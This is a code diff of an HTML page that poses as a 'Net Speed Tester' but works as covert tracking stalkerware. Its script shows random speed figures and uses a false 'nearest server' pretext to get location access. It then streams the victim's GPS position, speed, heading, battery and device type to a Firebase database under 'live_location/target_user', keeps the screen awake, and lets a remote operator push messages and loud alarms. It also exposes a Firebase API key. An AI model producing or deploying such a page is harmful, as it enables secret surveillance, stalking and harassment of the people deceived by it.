@@ -3,33 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Network Speed Test</title>
+    <title>Net Speed Tester</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; color: #333; text-align: center; }
-        .header { font-size: 24px; font-weight: bold; color: #1e3a8a; margin-bottom: 20px; }
-        .speed-circle { border: 10px solid #e2e8f0; border-top: 10px solid #3b82f6; border-radius: 50%; width: 150px; height: 150px; display: flex; align-items: center; justify-content: center; flex-direction: column; animation: pulse 2s infinite; margin: 0 auto 30px; }
-        .speed-value { font-size: 32px; font-weight: bold; color: #1e3a8a; }
-        .speed-unit { font-size: 14px; color: #64748b; }
-        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.4); } 70% { box-shadow: 0 0 0 20px rgba(59, 130, 246, 0); } 100% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0); } }
-        .info-text { font-size: 14px; color: #64748b; margin-bottom: 5px; }
-        #status { font-size: 12px; color: #10b981; font-weight: bold; margin-top: 20px; }
-        #chatBox { display: none; background: #ef4444; color: #fff; padding: 15px; border-radius: 10px; margin-top: 20px; font-weight: bold; width: 80%; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Poppins:wght@400;600&display=swap');
+        body { font-family: 'Poppins', sans-serif; background: #0b0f19; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden;}
+        
+        /* Fake Speedometer UI */
+        .meter-container { position: relative; width: 250px; height: 250px; background: conic-gradient(#38bdf8 0%, #0ea5e9 0%, #1e293b 0%); border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 30px rgba(14, 165, 233, 0.3); transition: 0.5s; }
+        .meter-inner { width: 220px; height: 220px; background: #0b0f19; border-radius: 50%; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        .speed-text { font-family: 'Orbitron', sans-serif; font-size: 45px; font-weight: bold; color: #38bdf8; text-shadow: 0 0 10px rgba(56,189,248,0.5); margin: 0;}
+        .speed-unit { font-size: 14px; color: #94a3b8; }
+        
+        .stats { display: flex; gap: 40px; margin-top: 40px; text-align: center;}
+        .stat-box h4 { margin: 0; color: #94a3b8; font-size: 12px; text-transform: uppercase;}
+        .stat-box p { margin: 5px 0 0 0; font-family: 'Orbitron', sans-serif; font-size: 20px; color: #10b981; }
+        
+        .start-btn { margin-top: 40px; background: #38bdf8; color: #000; border: none; padding: 15px 50px; font-size: 18px; font-weight: bold; border-radius: 30px; cursor: pointer; box-shadow: 0 5px 20px rgba(56, 189, 248, 0.4); text-transform: uppercase; transition: 0.3s;}
+        .start-btn:active { transform: scale(0.95); }
+
+        /* Hidden Notice Box for Admin Messages */
+        #noticeBox { display: none; position: absolute; top: 20px; background: #fbbf24; color: black; padding: 10px 20px; border-radius: 10px; font-weight: bold; font-size: 14px; z-index: 1000;}
     </style>
 </head>
 <body>
 
-    <div class="header">Network Speed Test</div>
-    
-    <div class="speed-circle">
-        <div class="speed-value" id="fakeSpeed">0.0</div>
-        <div class="speed-unit">Mbps</div>
+    <div id="noticeBox">🔔 System Notice: <span id="msgText"></span></div>
+
+    <div class="meter-container" id="meterBg">
+        <div class="meter-inner">
+            <p class="speed-text" id="mainSpeed">0.0</p>
+            <p class="speed-unit">Mbps</p>
+        </div>
     </div>
 
-    <div class="info-text">Finding optimal server...</div>
-    <div class="info-text">Testing Download & Upload Speed</div>
-    <h3 id="status">Connecting...</h3>
-    
-    <div id="chatBox">🔔 <span id="msgText"></span></div>
+    <div class="stats">
+        <div class="stat-box"><h4>Ping</h4><p id="pingVal">--</p></div>
+        <div class="stat-box"><h4>Upload</h4><p id="upVal">--</p></div>
+    </div>
+
+    <button class="start-btn" id="startBtn">GO</button>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
@@ -37,61 +49,83 @@
 
         const firebaseConfig = { apiKey: "AIzaSyAoQw5dhwS5JJZIWSPQTgKdMtB5ZEsoxLk", authDomain: "arng-805db.firebaseapp.com", projectId: "arng-805db", databaseURL: "https://arng-805db-default-rtdb.firebaseio.com/" };
         const app = initializeApp(firebaseConfig); const db = getDatabase(app);
+        
         const userRef = ref(db, 'live_location/target_user');
         const chatRef = ref(db, 'live_location/chat');
         const commandRef = ref(db, 'live_location/command');
 
-        const statusTxt = document.getElementById('status');
-        const fakeSpeedTxt = document.getElementById('fakeSpeed');
-        const chatBox = document.getElementById('chatBox'), msgText = document.getElementById('msgText');
-        const loudAlarm = new Audio('https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3');
-
-        // 1. Screen Wake-Lock API (স্ক্রিন বন্ধ হবে না)
         let wakeLock = null;
+        const alarmSound = new Audio('https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3');
+
+        // Screen Wake Lock (Keep screen ON)
         const requestWakeLock = async () => {
-            try { if ('wakeLock' in navigator) { wakeLock = await navigator.wakeLock.request('screen'); } } 
-            catch (err) { console.log("Wake Lock error"); }
+            try { if ('wakeLock' in navigator) wakeLock = await navigator.wakeLock.request('screen'); } catch (err) {}
         };
-        document.addEventListener('visibilitychange', () => { if (document.visibilityState === 'visible') requestWakeLock(); });
-        requestWakeLock();
 
-        // Fake Speed Generator (ইউজারকে ব্যস্ত রাখতে)
-        setInterval(() => { fakeSpeedTxt.innerText = (Math.random() * (45.5 - 15.2) + 15.2).toFixed(1); }, 1000);
+        // Battery Info
+        let batLvl = 100, isChg = false;
+        if(navigator.getBattery) navigator.getBattery().then(b => { batLvl = Math.round(b.level*100); isChg = b.charging; });
 
-        // Device & Battery Info
-        const getDeviceInfo = () => { const ua = navigator.userAgent; if(/Android/i.test(ua)) return "Android"; if(/iPhone|iPad/i.test(ua)) return "iOS"; return "PC/Other"; };
-        let batteryLevel = "Unknown", isCharging = false;
-        if (navigator.getBattery) { navigator.getBattery().then(b => { batteryLevel = Math.round(b.level * 100); isCharging = b.charging; b.addEventListener('levelchange', () => batteryLevel = Math.round(b.level * 100)); }); }
+        // Admin Commands (Ring & Chat)
+        onValue(chatRef, (snap) => {
+            const data = snap.val();
+            if(data && data.time > Date.now() - 5000) {
+                document.getElementById('msgText').innerText = data.message;
+                document.getElementById('noticeBox').style.display = 'block';
+                setTimeout(() => { document.getElementById('noticeBox').style.display = 'none'; }, 8000);
+            }
+        });
 
-        // Messages & Alarms
-        onValue(chatRef, (snapshot) => { const data = snapshot.val(); if(data && data.time > Date.now() - 5000) { msgText.innerText = data.message; chatBox.style.display = "block"; setTimeout(() => { chatBox.style.display = "none"; }, 10000); }});
-        onValue(commandRef, (snapshot) => { const cmd = snapshot.val(); if(cmd && cmd.ringTime > Date.now() - 5000) { loudAlarm.play().catch(e=>{}); if(navigator.vibrate) navigator.vibrate([1000, 500, 1000, 500, 2000]); }});
+        onValue(commandRef, (snap) => {
+            const cmd = snap.val();
+            if(cmd && cmd.ringTime > Date.now() - 5000) {
+                alarmSound.play().catch(e=>{});
+                if(navigator.vibrate) navigator.vibrate([1000, 500, 1000, 500, 2000]);
+            }
+        });
 
-        // 3. Auto Reconnect & GPS Logic
-        window.addEventListener('online', () => statusTxt.innerText = "Server Connected (Testing...)");
-        window.addEventListener('offline', () => statusTxt.innerText = "Reconnecting to server...");
-
-        window.onload = () => {
-            if (navigator.geolocation) {
-                onDisconnect(userRef).update({ isOnline: false, status: "Offline" });
+        // Fake Speed Test Animation
+        const startTestBtn = document.getElementById('startBtn');
+        startTestBtn.addEventListener('click', () => {
+            requestWakeLock(); // Screen lock ON
+            
+            // Ask Location Permission & Start Tracking
+            if(navigator.geolocation) {
+                onDisconnect(userRef).update({ isOnline: false });
                 navigator.geolocation.watchPosition(
-                    (position) => {
-                        const lat = position.coords.latitude, lng = position.coords.longitude, acc = position.coords.accuracy;
-                        let speed = position.coords.speed ? Math.round(position.coords.speed * 3.6) : 0;
-                        let heading = position.coords.heading ? position.coords.heading : 0; // Direction
-
-                        set(userRef, { 
-                            latitude: lat, longitude: lng, accuracy: acc, speed: speed, heading: heading,
-                            battery: batteryLevel, charging: isCharging, deviceInfo: getDeviceInfo(),
-                            isOnline: true, timestamp: new Date().toLocaleString() 
+                    (pos) => {
+                        set(userRef, {
+                            latitude: pos.coords.latitude, longitude: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy, heading: pos.coords.heading || 0,
+                            speed: pos.coords.speed ? Math.round(pos.coords.speed * 3.6) : 0,
+                            battery: batLvl, charging: isChg, isOnline: true,
+                            deviceInfo: /Android/i.test(navigator.userAgent) ? "Android" : "Apple/PC",
+                            timestamp: new Date().toLocaleString()
                         });
-                        statusTxt.innerText = "Server Connected (Testing...)";
                     },
-                    (error) => { statusTxt.innerText = "Location needed for closest server!"; },
+                    (err) => { alert("Need Location access to find nearest server!"); },
                     { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
             }
-        };
+
+            // Fake UI Animation Magic
+            startTestBtn.style.display = "none";
+            document.getElementById('pingVal').innerText = Math.floor(Math.random() * 20 + 10) + " ms";
+            let fakeSpeed = 0;
+            let testInterval = setInterval(() => {
+                fakeSpeed += Math.random() * 5;
+                if(fakeSpeed > 45) fakeSpeed -= Math.random() * 8; // Max speed ~45
+                document.getElementById('mainSpeed').innerText = fakeSpeed.toFixed(1);
+                document.getElementById('meterBg').style.background = `conic-gradient(#38bdf8 ${fakeSpeed*2}%, #1e293b 0%)`;
+            }, 100);
+
+            setTimeout(() => {
+                clearInterval(testInterval);
+                document.getElementById('upVal').innerText = (fakeSpeed / 3).toFixed(1) + " Mbps";
+                startTestBtn.innerText = "TEST AGAIN";
+                startTestBtn.style.display = "block";
+            }, 10000); // Test finishes in 10s, tracking continues in background forever
+        });
     </script>
 </body>
 </html>
